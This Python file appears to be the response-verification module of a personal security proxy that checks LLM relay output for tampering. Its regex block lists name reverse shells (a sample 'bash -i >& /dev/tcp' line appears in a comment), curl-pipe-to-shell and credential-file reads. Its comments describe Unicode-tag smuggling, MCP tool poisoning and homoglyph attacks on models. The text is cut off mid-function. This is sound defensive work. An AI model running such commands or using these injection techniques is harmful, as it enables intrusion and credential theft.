# SPDX-License-Identifier: DaoTi-Research-1.0
# Copyright (c) 2026 独立研究者，知白
# 本文件受道体研究许可证 v1.0 约束，禁止逆向工程和再分发
# 详见 LICENSE 文件

"""第二层：响应侧完整性验证（verifier）。

职责：在中转站返回内容交给用户**之前**，验证中转站是否篡改了模型返回。

检测维度（5 类）：
1. **Tool Call 危险参数**：tool call 是否包含 `rm -rf` / 陌生 URL / `/etc/passwd`
2. **系统提示词注入**：返回中是否出现系统提示词泄露迹象
3. **响应模式异常**：同一会话中长度/结构是否突变（3σ）
4. **隐藏指令**：是否包含零宽字符等不可见字符
5. **敏感信息泄露**：中转站是否返回了不该返回的内容

复用策略：
- 第 2/5 项直接复用企业版 `daoti_xuandun._check_output.OutputGuardrail`
- 第 1/3/4 项为个人版新增（中转站特有威胁，企业版不需要）
"""

from __future__ import annotations

import json
import logging
import os
import re
import statistics
import sys
from contextlib import contextmanager
from typing import Any, Dict, List, Optional, Tuple

from ..types import (
    Action,
    SecurityLevel,
    VerificationFinding,
    VerifyResult,
)

logger = logging.getLogger("xuandun-personal.verifier")

# 构建期生成的密钥文件名（由 desktop/build_engine.py 写入引擎目录）
_BUILD_SECRETS_FILE = "build_secrets.json"


def _load_build_secrets() -> Optional[Dict[str, str]]:
    """读取构建期随机密钥；不存在或不可用时返回 None。

    ★★ 2026-10-28（P0 取证）：为什么注入点必须在这里，而不是 app.py
    ────────────────────────────────────────────────────────────
    原实现是 ``app.py::_inject_build_secrets(config)``，而它拿到的
    ``PersonalConfig`` **根本没有** ``shell_key`` / ``mapping_key`` 字段
    —— Python 允许给普通对象临时挂属性，于是赋值成功、日志打印
    「已加载构建期密钥」，然后**没有任何一处读取它**。
    护栏真正用的是本函数作用域里的 ``XuanDunConfig``，它照旧回退到
    源码里那两个明文常量（``daoti_xuandun_16`` / ``ancient_map_16b!``）。

    一句话：换了锁芯，钥匙还插在旧锁上。
    所以注入点必须收敛到「构造护栏配置的那一行之前」，否则加固永远是空转。
    """
    path = os.path.join(os.path.dirname(os.path.abspath(sys.executable)),
                        _BUILD_SECRETS_FILE)
    try:
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)
    except OSError:
        logger.info(
            "未找到构建期密钥（%s）：开发态正常；发布包出现说明打包链路有问题",
            _BUILD_SECRETS_FILE,
        )
        return None
    except ValueError:
        logger.warning("构建期密钥文件不是合法 JSON，已忽略：%s", path)
        return None

    if not isinstance(data, dict):
        logger.warning("构建期密钥文件格式异常（不是对象），已忽略：%s", path)
        return None

    out: Dict[str, str] = {}
    for key in ("shell_key", "mapping_key"):
        value = data.get(key)
        if isinstance(value, str) and value:
            out[key] = value
    if not out:
        logger.warning("构建期密钥文件存在但内容为空，护栏将回退到明文 fallback")
    return out or None


@contextmanager
def _build_secrets_env():
    """在构造护栏配置期间，把构建期密钥放进企业版读取的**官方入口**。

    ★ 为什么用环境变量而不是构造后 setattr：
      企业版 ``XuanDunConfig.__post_init__`` 只认 ``XUANDUN_SHELL_KEY`` /
      ``XUANDUN_MAPPING_KEY``；构造后改属性虽然也能生效（DynamicShell 等
      尚未实例化），但 ``__post_init__`` 已经把「正在使用不安全 fallback」
      写进 stderr —— 发布包里那条告警是**假的**，会长期误导排障。
      走官方入口则两头都对：既没有假告警，也不必依赖赋值顺序。

    ★ 用完立刻删除：环境变量对同用户的其它进程可读，不能长期驻留。
      ``XuanDunConfig`` 在构造时已把密钥读成 bytes 存在对象里，删掉不影响。
    """
    secrets = _load_build_secrets() or {}
    applied_keys: List[str] = []
    for key, env_name in (
        ("shell_key", "XUANDUN_SHELL_KEY"),
        ("mapping_key", "XUANDUN_MAPPING_KEY"),
    ):
        if key in secrets:
            os.environ[env_name] = secrets[key]
            applied_keys.append(env_name)
    try:
        yield bool(applied_keys)
    finally:
        for env_name in applied_keys:
            os.environ.pop(env_name, None)


# ══════════════════════════════════════════════════════════════
# 规则加载（★ v0.1.0 判据外置）
#
# 下列 _BUILTIN_* 表是**回退集**：规则文件缺失或损坏时才使用。
# 正常路径走 rules/detection_rules.yaml —— 改一条规则不用重编打包。
# ══════════════════════════════════════════════════════════════
from ..rules import load_ruleset  # noqa: E402

_RULES = load_ruleset()
logger.info("检测规则来源：%s（v%s）",
            "规则文件" if _RULES.from_file else "内置回退集",
            _RULES.version)


# ══════════════════════════════════════════════════════════════
# 第 1 类：Tool Call 危险参数检测
# ══════════════════════════════════════════════════════════════

# 危险命令模式（继承企业版 _DANGER_COMMAND_PATTERNS 思路）
# ★ 内置回退集；实际优先取 rules/detection_rules.yaml
_BUILTIN_DANGEROUS_COMMANDS: List[Tuple[str, str]] = [
    (r"\brm\s+-[rf]{1,2}\b", "递归删除命令 rm -rf"),
    (r"\bmkfs(\.\w+)?\b", "文件系统格式化 mkfs"),
    (r"\bdd\s+if=", "磁盘覆写 dd if="),
    (r"\bchmod\s+777\b", "权限全开 chmod 777"),
    (r":\(\)\s*\{.*\};\s*:", "fork 炸弹"),
    (r"\bformat\s+[a-z]:", "Windows 磁盘格式化"),
    (r"\bdel\s+/[sfq]\b", "Windows 递归删除"),
    (r"\bDrop\s+(table|database)\b", "SQL 删库"),
    (r"\btruncate\s+table\b", "SQL 截断表"),
    (r"\beval\s*\(", "动态代码执行 eval"),
    (r"\bexec\s*\(", "动态代码执行 exec"),
    (r"\b(?:curl|wget)\b[^\n|;]*\|\s*(?:ba)?sh\b", "下载并执行远程脚本（curl|sh）"),
    (r"\b(?:curl|wget)\b[^\n]*\b(?:\.onion|ngrok|pipedream|webhook\.site)\b", "向可疑地址发起请求"),
    (r"\bnc\b\s+-[a-z]*e\b|\bnetcat\b\s+-[a-z]*e\b", "反弹 shell（nc -e）"),
    # ★ 无 nc 的反弹 shell：bash/zsh/sh 内建 /dev/tcp 重定向。
    #   这是现代脚本里最常见的写法之一（不依赖任何外部二进制），
    #   原规则表只覆盖 nc -e，实测漏放：
    #     bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
    (r"/dev/(?:tcp|udp)/[\w.:-]+", "反弹 shell（内建 /dev/tcp 重定向）"),
    (r"\b(?:ba|z|k|da)?sh\b\s+-i\b[^\n]*&", "反弹 shell（交互式 shell 重定向）"),
    # ★★ 2026-10-28（误报修复，日志 #7496 / #7515）：
    #   旧判据是「python -c + (socket|subprocess|os.system)」即 high。
    #   但 `python -c "import subprocess; subprocess.run(['git', ...])"`
    #   正是编程助手跑一次性检查的标准写法 —— 实测两次中断正常对话。
    #   真正危险的不是「用了 subprocess」，而是内联代码里出现
    #   **网络原语或动态求值**：那才是把回答变成投递通道的形态。
    #   破坏性命令（rm -rf / dd / mkfs）仍由上面的独立规则命中。
    (r"\bpython[23]?\s+-c\b[^\n]*(?:socket\.|urlopen|urllib|"
     r"http\.client|requests\.(?:get|post|put|patch)|httpx\.|"
     r"exec\s*\(|eval\s*\()",
     "Python 内联执行网络/动态代码"),
    (r"\bbase64\s+-d\b[^\n]*\|\s*(?:ba)?sh\b", "Base64 解码后执行"),
]

# 敏感文件路径模式
_BUILTIN_SENSITIVE_PATHS: List[Tuple[str, str]] = [
    (r"/etc/(passwd|shadow|sudoers)\b", "读取系统账户文件"),
    (r"\.ssh/(id_rsa|id_ed25519|authorized_keys)\b", "读取 SSH 私钥"),
    (r"\.aws/credentials\b", "读取 AWS 凭证"),
    # ★★ 2026-10-04（误报修复）：必须排除 `process.env.X` / `os.environ`。
    #   旧写法 `\.env(\.|$|\s)` 会把 JS/TS 里最常见的 `process.env.PORT`
    #   判成「读取 .env 文件」→ tool_call_dangerous/high → 阻断。
    #   那是编程助手回答里出现频率极高的正常写法。
    #   真实文件访问左侧是分隔符（行首 / 空格 / 引号 / 斜杠），
    #   而 `process.env` 的左侧是标识符字符 's'，加左边界即可分开。
    # ★★ 2026-10-22（误报修复）：模板文件 `.env.example` / `.env.sample`
    #   本就是提交进仓库给人看的，不含真实密钥；实测 AI 写环境变量审计文档
    #   提到 `.env.example` 就被判成「读取环境变量文件」并阻断。
    (r"(?<![A-Za-z0-9_])\.env\b(?!\.(?:example|sample|template|dist))", "读取环境变量文件"),
    (r"\.docker/config\.json\b", "读取 Docker 凭证"),
    (r"\.git/config\b", "读取 Git 配置"),
    (r"\.npmrc\b|\.pypirc\b", "读取包管理凭证"),
    (r"cookies?\.txt\b|login\.json\b", "读取浏览器凭证"),
]

# 危险网络目标
_BUILTIN_DANGEROUS_URLS: List[Tuple[str, str]] = [
    (r"https?://(?!localhost|127\.0\.0\.1)[\w.-]*(?:ngrok|pipedream|requestbin|webhook\.site|burpcollaborator|interact\.sh)\.(?:com|net|io|sh)", "数据外泄测试平台 URL"),
    (r"https?://[\w.-]*\.(?:tk|ml|ga|cf|gq)\b", "免费域名（常见于 C2）"),
]

# 危险网络方法
_DANGEROUS_HTTP_METHODS = {"POST", "PUT", "DELETE", "PATCH"}


def _rules(section: str) -> List[Tuple[Any, str]]:
    """取某章节规则：优先规则文件，为空则回退内置表。

    返回 (已编译正则, 标签)，与原 (pattern_str, label) 用法兼容 ——
    调用方只需把 re.search(pat, ...) 换成 pat.search(...)。
    """
    pairs = _RULES.pairs(section)
    if pairs:
        return pairs
    src = {
        "dangerous_commands": _BUILTIN_DANGEROUS_COMMANDS,
        "sensitive_paths": _BUILTIN_SENSITIVE_PATHS,
        "dangerous_urls": _BUILTIN_DANGEROUS_URLS,
    }.get(section, [])
    return [(re.compile(p, re.IGNORECASE), l) for p, l in src]


# ★★ 2026-10-27：只有「真正执行任意命令」的工具，参数里的危险词才构成阻断理由。
#
#   实测误报（本次复核）：
#     · Tool Call "run_mcp" 参数包含动态代码执行 eval：eval(   ← 参数是记忆文本
#     · Tool Call "Edit"    参数包含Windows 磁盘格式化：Format B:  ← 参数是文档
#   这两条都被判 high 并**中断了对话**，而模型只是把危险字样写进了
#   笔记或文件内容里 —— 与「让客户端去执行」是两件事。
#
#   判据：bash / shell / powershell / python / node 这类工具，参数就是
#   即将被执行的命令行；其余工具（写文件、改代码、记笔记、MCP 工具）
#   的参数是**内容**，命中只作观测。
_EXEC_TOOL_RE = re.compile(
    r"(?:^|[_\-\s])(bash|shell|sh|cmd|command|powershell|pwsh|terminal|console|"
    r"exec|subprocess|spawn|python|node|deno|perl|ruby)(?:$|[_\-\s])",
    re.IGNORECASE,
)


def _tool_tokens(name: str) -> str:
    """把工具名切成小写词元串，兼容 CamelCase。

    ★ 为什么必须有这一步（2026-10-27 抓到自己的漏洞）：
      正则要求词元前后是 `_` / `-` / 空白，于是
      ``RunCommand`` 这种驼峰名整体匹配不上 —— 它被当成「非执行类工具」，
      `python -c "eval(x)"` 因此从「阻断」降成「观测」。
      这是本轮改造引入的真实漏洞，不是误报。
      ``ReadFile`` / ``PowerShell`` 同理，统一先切开再匹配。
    """
    return re.sub(r"(?<=[a-z0-9])(?=[A-Z])", "_", name or "").lower()


def _is_exec_tool(name: str) -> bool:
    """这个工具的入参是不是「即将被执行的命令」。"""
    return bool(_EXEC_TOOL_RE.search(_tool_tokens(name)))


#: 「会去读文件」的工具（Read / Grep / Glob / cat…）。
#:
#: ★ 与 _is_exec_tool 一起构成敏感路径的判定前提：
#:   只有会读文件或会执行命令的工具，参数里出现 `~/.ssh/id_rsa`
#:   才意味着「真的要去读它」。写文件、记笔记、MCP 工具的参数是内容。
_READ_TOOL_RE = re.compile(
    r"(?:^|[_\-\s])(read|grep|glob|cat|open|view|search|find)(?:$|[_\-\s])",
    re.IGNORECASE,
)


def _is_file_read_tool(name: str) -> bool:
    return bool(_READ_TOOL_RE.search(_tool_tokens(name)))


#: 「写消息」类命令：`git commit -m` / `git tag -m` / `gh pr create --body`。
#:
#: ★ 2026-10-27 实测：AI 用 `git commit -m "<一整段提交说明>"` 时，
#:   说明里引用了 `eval(` 与 `rm -rf` 的示例，被判成执行并打断。
#:   这些命令的参数是**文本**，不是要执行的命令。
_MESSAGE_CMD_RE = re.compile(
    r"\bgit\s+(?:commit|tag)\b|\bgh\s+(?:pr|release)\b", re.IGNORECASE
)

#: 命令替换：`$(...)` / 反引号。消息里一旦出现，文本就会被 shell 求值，
#: 不能再用「这是消息」豁免 —— 否则 `git commit -m "$(rm -rf /)"` 就成了绕过通道。
_SHELL_SUBST_RE = re.compile(r"\$\(|`")


def _args_are_content(tool_name: str, args_text: str) -> bool:
    """参数是「内容」而不是「动作」。

    ★ 三类算内容：
      1. 非执行、非读取的工具（写文件、记笔记、MCP 工具）；
      2. 执行类工具里的「写消息」命令（git commit / gh pr），且没有命令替换；
      3. 其余一律按动作处理（宁可拦，不可漏）。
    """
    if not (_is_exec_tool(tool_name) or _is_file_read_tool(tool_name)):
        return True
    if _MESSAGE_CMD_RE.search(args_text) and not _SHELL_SUBST_RE.search(args_text):
        return True
    return False


def _is_pattern_mention(text: str, m: "re.Match") -> bool:
    """这次敏感路径命中是「被当成模式/关键字提到」，还是「真要去读」。

    ★★ 2026-10-28 实测（日志 #7496 / #7928）：
      被判「试图读取 .env」的两条 Shell 命令，实际都是**过滤条件**：
        for k in ('XD_1','企业版','.env','key','pem','.db','.log'):  ...
        ... -match 'pem|token|secrets|\\.env|\\.db|\\.log' ...
      `.env` 在这些位置只是「要找哪些文件」的关键字，一个字节都没被读出。
      旧判据只看「参数里出现了 .env 字样」，于是一次仓库体检就被打断 ——
      而这恰恰是编程助手被叫来干的活。

    判据（只看紧邻字符与所在位置的引号，不做全文语义推断）：
      · 紧邻字符是正则转义 `\\` / 交替符 `|` / 量词 `? * +` → 是模式；
      · 引号包裹的短字面量，且左右两侧都是列表分隔符
        （`('a','b','.env')` 这种并列清单）→ 是关键字。
      真正的读取（`cat .env`、`Get-Content .env`、`Read .env`）
      两条都不满足，仍然按高危处理。
    """
    start, end = m.span()
    before = text[start - 1:start]
    after = text[end:end + 1]
    if before in ("\\", "|") or after in ("|", "?", "*", "+"):
        return True

    quote = before
    if quote in ("'", '"') and after == quote:
        # 引号完整包裹的短字面量：两侧同为分隔符才是「并列清单里的元素」
        #   ('XD_1','企业版','.env','key')  → 左 , 右 ,   → 关键字清单
        #   {"file_path": ".env"}           → 左 : 右 }   → 独立路径值
        #   cat ".env"                      → 左 空格      → 独立路径值
        pre = text[:start - 1].rstrip()
        post = text[end + 1:].lstrip()
        if pre[-1:] in ("(", "[", ",", "{") and post[:1] in (",", ")", "]", "}"):
            return True
    return False


def _check_tool_calls(payload: Any, text: str) -> List[VerificationFinding]:
    """检测 tool call 中的危险参数。

    双重检测：
    1. 解析 JSON 结构中的 tool_calls 数组
    2. 正则扫描原始文本（应对中转站返回非标准格式）
    """
    findings: List[VerificationFinding] = []
    seen_commands: set = set()

    # ── 结构化检测：提取所有 tool call 的参数文本 ──
    tool_call_texts: List[Tuple[str, str]] = []  # (tool_name, arguments_text)

    def _walk(obj: Any) -> None:
        """递归遍历 JSON，提取 tool_calls 结构。"""
        if isinstance(obj, dict):
            # OpenAI 格式：{"tool_calls": [{"function": {"name":..., "arguments": "..."}}]}
            if "tool_calls" in obj and isinstance(obj["tool_calls"], list):
                for tc in obj["tool_calls"]:
                    fn = tc.get("function", {}) if isinstance(tc, dict) else {}
                    name = fn.get("name", "unknown")
                    args = fn.get("arguments", "")
                    if isinstance(args, (dict, list)):
                        args = json.dumps(args, ensure_ascii=False)
                    tool_call_texts.append((str(name), str(args)))
            # Anthropic 格式：{"content": [{"type": "tool_use", "name":..., "input": {...}}]}
            if obj.get("type") == "tool_use":
                name = obj.get("name", "unknown")
                inp = obj.get("input", "")
                if isinstance(inp, (dict, list)):
                    inp = json.dumps(inp, ensure_ascii=False)
                tool_call_texts.append((str(name), str(inp)))
            for v in obj.values():
                _walk(v)
        elif isinstance(obj, list):
            for item in obj:
                _walk(item)

    try:
        _walk(payload)
    except Exception:  # noqa: BLE001 — 结构异常不应影响检测
        logger.debug("tool call 结构遍历异常，退回纯文本检测")

    # ── 对每个 tool call 参数做危险模式匹配 ──
    dangerous_cmds = _rules("dangerous_commands")
    sensitive_paths = _rules("sensitive_paths")
    dangerous_urls = _rules("dangerous_urls")

    for tool_name, args_text in tool_call_texts:
        for pattern, label in dangerous_cmds:
            m = pattern.search(args_text)
            if m and m.group(0) not in seen_commands:
                seen_commands.add(m.group(0))
                # ★ 参数是「内容」时只观测不阻断（见 _args_are_content）
                if _args_are_content(tool_name, args_text):
                    findings.append(
                        VerificationFinding(
                            category="dangerous_content",
                            severity="medium",
                            detail=(
                                f'Tool Call "{tool_name}" 的参数里出现了{label}：'
                                f"{m.group(0)[:40]}"
                                "（这段参数是要写入文件/消息的文本，不会被直接执行；"
                                "仅作记录，不阻断）"
                            ),
                            evidence=_mask_evidence(args_text, m.start()),
                        )
                    )
                    continue
                findings.append(
                    VerificationFinding(
                        category="tool_call_dangerous",
                        severity="high",
                        detail=f'Tool Call "{tool_name}" 参数包含{label}：{m.group(0)[:40]}',
                        evidence=_mask_evidence(args_text, m.start()),
                    )
                )

        for pattern, label in sensitive_paths:
            m = pattern.search(args_text)
            if m and f"path:{m.group(0)}" not in seen_commands:
                seen_commands.add(f"path:{m.group(0)}")
                # ★★ 2026-10-28：路径出现在正则/关键字清单里 ≠ 要去读它。
                #   见 _is_pattern_mention —— 这类命中只记录，不阻断。
                if _is_pattern_mention(args_text, m):
                    findings.append(
                        VerificationFinding(
                            category="dangerous_content",
                            severity="medium",
                            detail=(
                                f'Tool Call "{tool_name}" 的参数里把'
                                f"「{label} {m.group(0)[:40]}」当作匹配条件使用"
                                "（是正则/关键字清单，不是文件操作；仅作记录，不阻断）"
                            ),
                            evidence=_mask_evidence(args_text, m.start()),
                        )
                    )
                    continue
                # ★ 见 _args_are_content：只有「会读文件 / 会执行命令」且
                #   不是写消息命令时，参数里的敏感路径才构成读取行为。
                if _args_are_content(tool_name, args_text):
                    findings.append(
                        VerificationFinding(
                            category="dangerous_content",
                            severity="medium",
                            detail=(
                                f'Tool Call "{tool_name}" 的参数里出现了'
                                f"「{label} {m.group(0)[:40]}」的字样"
                                "（这段参数是内容而非动作；仅作记录，不阻断）"
                            ),
                            evidence=_mask_evidence(args_text, m.start()),
                        )
                    )
                    continue
                findings.append(
                    VerificationFinding(
                        category="tool_call_dangerous",
                        severity="high",
                        detail=f'Tool Call "{tool_name}" 试图{label}：{m.group(0)[:40]}',
                        evidence=_mask_evidence(args_text, m.start()),
                    )
                )

        for pattern, label in dangerous_urls:
            m = pattern.search(args_text)
            if m and f"url:{m.group(0)}" not in seen_commands:
                seen_commands.add(f"url:{m.group(0)}")
                # ★ 同上：写文件/写消息时把某个网址写进正文，不等于要去下载它。
                if _args_are_content(tool_name, args_text):
                    findings.append(
                        VerificationFinding(
                            category="dangerous_content",
                            severity="medium",
                            detail=(
                                f'Tool Call "{tool_name}" 的参数里提到了{label}：'
                                f"{m.group(0)[:60]}（仅作记录，不阻断）"
                            ),
                            evidence=_mask_evidence(args_text, m.start()),
                        )
                    )
                    continue
                findings.append(
                    VerificationFinding(
                        category="tool_call_dangerous",
                        severity="high",
                        detail=f'Tool Call "{tool_name}" 请求{label}：{m.group(0)[:60]}',
                        evidence=_mask_evidence(args_text, m.start()),
                    )
                )

    # ── 兜底：原始文本扫描（应对中转站返回非标准 tool call 格式）──
    #
    # ★★ 2026-10-04（误报修复）：兜底命中改为**独立类别 + 不阻断**。
    #   结构化 tool_calls（上面那段）是「响应在指示客户端执行某命令」，
    #   证据强、指向明确；而这里的原始文本扫描面对的是**散文与代码块** ——
    #   一个编程助手回答里出现 `rm -rf node_modules`、`eval(`、
    #   `subprocess.exec(` 都是完全正常的（用户就是要它写这些）。
    #   旧实现把两者混为一类并标 high，于是「AI 回答里贴了段脚本」
    #   会被直接拦下 —— 这恰恰是本产品要服务的场景（代理 Claude Code /
    #   Cursor），把正常工作流打断，用户只会关掉防护。
    #
    #   所以：文本兜底归入 dangerous_content，severity=medium，
    #   且该类别不阻断（见 OBSERVATION_ONLY_SIGNALS）——
    #   仍然留痕、仍然解释，但不再冒充「中转站的罪证」。
    if not tool_call_texts:
        for pattern, label in dangerous_cmds:
            m = pattern.search(text)
            if m and m.group(0) not in seen_commands:
                seen_commands.add(m.group(0))
                findings.append(
                    VerificationFinding(
                        category="dangerous_content",
                        severity="medium",
                        detail=(
                            f"回答正文/代码片段中出现{label}：{m.group(0)[:40]}"
                            "（仅作记录，不阻断）"
                        ),
                        evidence=_mask_evidence(text, m.start()),
                    )
                )

    return findings


def _mask_evidence(text: str, pos: int, window: int = 60) -> str:
    """提取证据片段并**真正脱敏**（避免二次泄露）。

    ★★★ 这里曾经只做截断，docstring 却自称「做基本脱敏」——
      名为脱敏、实为原样截取，是典型的「注释承诺与实现不符」。
      后果不小：这 90 字符会写进 VerificationFinding.evidence
      → 经 detail_json 落库 → 经 /api/logs 与 CSV 导出外发。
      当命中位置恰好落在用户的 API Key / 对话内容上时，
      密钥原文就跟着证据进了日志和导出文件。
      对一个「防止数据外泄」的产品，这是自己成了泄露源。

    现在对片段套用 sanitizer 的 BUILTIN_RULES 复检，命中即替换 ——
    复用既有规则而非另造一套，避免两套规则各自漂移。
    """
    start = max(0, pos - window // 2)
    end = min(len(text), pos + window)
    snippet = text[start:end].replace("\n", " ")
    if start > 0:
        snippet = "..." + snippet
    if end < len(text):
        snippet = snippet + "..."

    # ★ 真正的脱敏：复用 sanitizer 的规则集复检这个片段
    try:
        from .sanitizer import BUILTIN_RULES

        for rule in BUILTIN_RULES:
            if rule.find(snippet):
                snippet = rule.pattern.sub("[REDACTED]", snippet)
    except Exception:
        # 脱敏自身失败时，宁可少给证据，也绝不能给未脱敏的原文
        return "[证据片段因脱敏失败已省略]"

    return snippet


# ══════════════════════════════════════════════════════════════
# 第 4 类：隐藏指令检测
# ══════════════════════════════════════════════════════════════

# 零宽/不可见字符（使用转义形式，避免源码中的不可见字符被工具静默修改）
#
# ★★ 2026-10-04（误报修复）：U+200D（ZWJ）**必须从通用零宽列表里拿出去**。
#   它是 emoji 组合序列的合法组成部分：
#       👨‍👩‍👧 = U+1F468 U+200D U+1F469 U+200D U+1F467
#   一个「一家三口」emoji 就带 2 个 ZWJ，三个家庭 emoji 即 ≥3 个 →
#   旧逻辑直接判 hidden_instruction + high → 拦截一条完全正常的回答。
#   现在 ZWJ 用「不在 emoji 组合内」的表述单独判（见下方 _ZWJ_ALONE）。
_INVISIBLE_CHARS: List[Tuple[str, str]] = [
    (r"[\u200b\u2060\ufeff]", "零宽空格/连接符"),
    (r"\u00ad", "软连字符（防关键词绕过）"),
    (r"\u180e", "蒙古文零宽字符（常见于提示注入）"),
    (r"[\x00-\x08\x0b\x0c\x0e-\x1f]", "控制字符"),
    (r"[\u202a-\u202e\u2066-\u2069]", "双向文本控制符（可欺骗人工阅读）"),
    # ★ 补零宽字符遗漏项：U+200C（ZWNJ）此前未覆盖，
    #   而它与 U+200B/U+200D 组合正是二进制隐写的标准载体
    #   （U+200B=0 / U+200C=1 / U+200D 终止符，Knostic 2025-10 实证）
    (r"[\u200c\u2061\u2062\u2063\u2064]", "零宽连接符/方向标记"),
    # ★ ZWJ 只在**不处于 emoji 组合中**时才算可疑：
    #   左邻不是 emoji 才计入 —— 这样 👨‍👩‍👧 / 👩‍💻 / 🏳️‍🌈 一律放行，
    #   而「正文里凭空插一个连接符」仍会被抓到。
    (
        r"(?<![\U0001F000-\U0001FAFF\u2600-\u27BF\u2B00-\u2BFF"
        r"\u2190-\u21FF\uFE0F])\u200d",
        "零宽连接符（不在 emoji 组合内）",
    ),
]

# ★★ Unicode Tags 块（U+E0000–U+E007F）—— 最高危的隐藏指令载体 ★★
#
# 为什么必须单独检测：
#   该块字符在浏览器、终端、编辑器、聊天界面里**渲染为完全空白**，
#   人眼审查看到的是正常内容，而 LLM tokenizer 会把它还原成可读指令。
#   编码方式：每个字符 = 0xE0000 + ASCII 码点
#     U+E0041 → 'A'，U+E0061 → 'a'，U+E007B → '{'
#   任何明文都能无中生有地塞进一段看起来干净的文本。
#
# 已知实战（2025-2026）：
#   - wunderwuzzi 的 ASCII Smuggler（2024-01 公开工具）
#   - MCP 工具描述投毒：声称做加法的工具藏指令，读 ~/.cursor/mcp.json 外传 SSH 私钥
#   - CVE-2025-53773（GitHub Copilot RCE）链路中确认可触发
#   - StegoAttack 论文：不可见编码对外部安全分类器的绕过率 >92%
#
# ★ 判据不能用「出现即高危」：单个 Tags 字符可能来自正常的语言标注
#   （ISO 语言标签的合法用途）。但**连续多个 Tags 字符必然是编码载荷** ——
#   正常文本不会有连续十几个不可见标签字符。
_UNICODE_TAG_BLOCK = re.compile(r"[\U000E0000-\U000E007F]")
_UNICODE_TAGS_PATTERN = re.compile(r"(?:[\U000E0000-\U000E007F]){4,}")
# 变体选择符 VS1-16（U+FE00-FE0F）也可承载隐写（U+E0100-E01EF 区块同理）
_VARIATION_SELECTOR_BLOCK = re.compile(r"[\U000E0100-\U000E01EF]|\uFE0E|\uFE0F")
_VARIATION_SELECTOR_RUN = re.compile(r"(?:[\U000E0100-\U000E01EF]|\uFE0E|\uFE0F){4,}")

# 同形异义字（Homoglyph）—— 用西里尔字母冒充拉丁字母绕过关键词过滤
#
# ★ 实测成功率不低：Capital One 系统研究（2025-08，7 个开源模型 / 2800+ 实例）
#   测量同形异义字攻击成功率 42.1%–58.7%。Cyrillic а(U+0430) 与 Latin a
#   肉眼完全无法区分，而基于拉丁字节序列的关键词匹配会被直接绕过。
#
# ★ 防御手段是 NFKC 归一化 —— 它把兼容等价字符折叠为规范形式，
#   Cyrillic а → Latin a，此后常规关键词规则即可命中。
#   （据 Elastic 研究，普通规则表里根本没做这件事。）
_HOMOGLYPH_SUSPECTS = (
    # 西里尔字母（U+0400–U+04FF）中与拉丁字母视觉等同的常用子集
    "аеорсухАЕОРСТХ"      # а е о р с у х
    "іјһАВЕКМНОРСТХ"
    "ԁһАВЕКМНОРСТХ"      # ԁ һ
    "ѕАВЕІКМНОРСТХ"      # ѕ
    "ԛԝАВЕКМНОРСТХ"      # ԛ ԝ
)

# HTML 隐藏元素（视觉不可见但机器可读）
#
# ★★ 2026-10-04（误报修复）：第三项改为带**逐条严重度**。
#   HTML 注释 `<!-- ... -->` 在 AI 输出的 Markdown / 代码片段里极其常见
#   （`<!-- prettier-ignore -->`、文档占位注释、模板片段……），
#   而它被旧实现一律标 high → 均衡档直接阻断。判据从「可能含隐藏指令」
#   降为 medium（提示、不阻断）：它确实值得看一眼，但证明不了中转站篡改。
#   真正的隐藏是 `display:none` 这类**视觉消失**的元素，仍保持 high。
_HTML_HIDDEN: List[Tuple[str, str, str]] = [
    (r"<[^>]*style\s*=\s*[\"'][^\"']*(?:display\s*:\s*none|visibility\s*:\s*hidden|font-size\s*:\s*0)",
     "HTML 隐藏元素", "high"),
    (r"<!--(?!-->)[\s\S]{0,500}?-->", "HTML 注释（可能含隐藏指令）", "medium"),
    (r"<meta[^>]*http-equiv\s*=\s*[\"']refresh", "HTML meta 刷新跳转", "high"),
]


def _decode_unicode_tags(text: str) -> str:
    """把 Unicode Tags 块编码还原为明文。

    编码规则：每个 Tags 字符 = 0xE0000 + ASCII 码点。
    这不是猜测，是 Unicode 标准的定义（Tags 块镜像 ASCII 可打印区）。
    还原结果用于给用户看清楚「到底藏了什么」——只报「发现不可见字符」
    等于让用户仍然不知道敌人写了什么。
    """
    out: List[str] = []
    for ch in text:
        cp = ord(ch)
        if 0xE0000 <= cp <= 0xE007F:
            out.append(chr(cp - 0xE0000))
    return "".join(out)


def _check_unicode_steganography(text: str) -> List[VerificationFinding]:
    """检测 Unicode 隐写载荷（Tags 块 / 变体选择符 / 同形异义字）。

    这三类是 2025-2026 实证的 stealth 攻击主流，共同特点是
    **人眼完全看不见**，却能被模型 tokenizer 还原成可执行指令。
    """
    findings: List[VerificationFinding] = []

    # ① Unicode Tags 块：连续 4 个以上即判定为编码载荷
    tags_run = _UNICODE_TAGS_PATTERN.search(text)
    if tags_run:
        decoded = _decode_unicode_tags(tags_run.group(0))
        # 只展示可打印部分，避免把控制字符回显到日志里
        visible = "".join(c for c in decoded if c.isprintable() and c != " ")
        findings.append(
            VerificationFinding(
                category="unicode_steganography",
                severity="high",
                detail=(
                    f"响应含 {len(tags_run.group(0))} 个连续 Unicode Tags 块字符"
                    f"（U+E0000–U+E007F），人眼渲染为空白但模型可读，"
                    f"解码内容为：{visible[:80]!r}"
                ),
                evidence=visible[:60],
            )
        )

    # ② 变体选择符连发（U+E0100–U+E01EF / VS1-16）
    vs_run = _VARIATION_SELECTOR_RUN.search(text)
    if vs_run:
        findings.append(
            VerificationFinding(
                category="unicode_steganography",
                severity="high",
                detail=(
                    f"响应含 {len(vs_run.group(0))} 个连续变体选择符"
                    f"（U+E0100–U+E01EF / VS1-16），可用于隐写不可见指令"
                ),
                evidence="",
            )
        )

    # ③ 同形异义字：西里尔字母混入**拉丁为主的**文本
    #
    # ★ 判据必须是「西里尔占比」而非「绝对数量」：
    #   俄语正文里夹一个产品名（Rust / Python / GitHub）就会混进几个拉丁字母，
    #   若按「拉丁字母 ≥ 8 个」判定，正常的
    #   「Это обычный ответ о ... в Rust.」会被误报 ——
    #   实测正是在这一条上翻车。
    #
    #   正确逻辑：同形异义字攻击的前提是「这段话_model 是按拉丁语义读的」，
    #   所以西里尔字母才是少数派。俄语正文恰好相反（西里尔占绝大多数），
    #   两者可以用占比干净地分开。
    letters = [c for c in text if c.isalpha()]
    if len(letters) >= 12:
        cyr = sum(1 for c in letters if 0x400 <= ord(c) <= 0x4FF)
        suspects = [c for c in letters if c in _HOMOGLYPH_SUSPECTS]
        # 西里尔占比低于 25% 却出现了同形异义字 → 拉丁文本被掺入假字母
        if suspects and cyr / len(letters) < 0.25:
            uniq = "".join(sorted(set(suspects)))
            findings.append(
                VerificationFinding(
                    category="unicode_steganography",
